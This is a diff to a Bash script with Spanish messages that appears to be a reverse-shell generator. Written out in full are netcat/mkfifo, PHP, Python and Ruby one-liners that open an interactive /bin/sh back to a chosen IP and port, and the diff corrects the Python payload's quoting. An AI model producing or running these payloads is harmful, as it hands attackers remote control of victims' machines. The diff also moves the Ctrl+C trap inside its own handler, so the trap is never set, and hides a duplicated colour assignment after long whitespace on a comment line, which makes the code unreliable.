@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#COLOURS
+#COLOURS                                                                         greenColour="\e[0;32m\033[1m"
 greenColour="\e[0;32m\033[1m"
 endColour="\033[0m\e[0m"
 redColour="\e[0;31m\033[1m"
@@ -11,11 +11,11 @@ turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
 #FUNCTION CTRL + C
-trap ctrl_c INT
 function ctrl_c(){
-echo -e "\n${yellowColour}[]${endColour}${grayColour}Saliendo${endColour}"
+    trap ctrl_c INT
+    echo -e "\n${yellowColour}[]${endColour}${grayColour}Saliendo${endColour}"
     exit 0
-}                                                                           
+}
 
 #BANNER
 echo -e "${redColour}    ____                                   _____ __         ____"
@@ -65,7 +65,7 @@ netcat="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
 
 php="php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
-python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
 ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 
@@ -119,6 +119,3 @@ case $shell in
          ;;
 
 esac
-
-
-
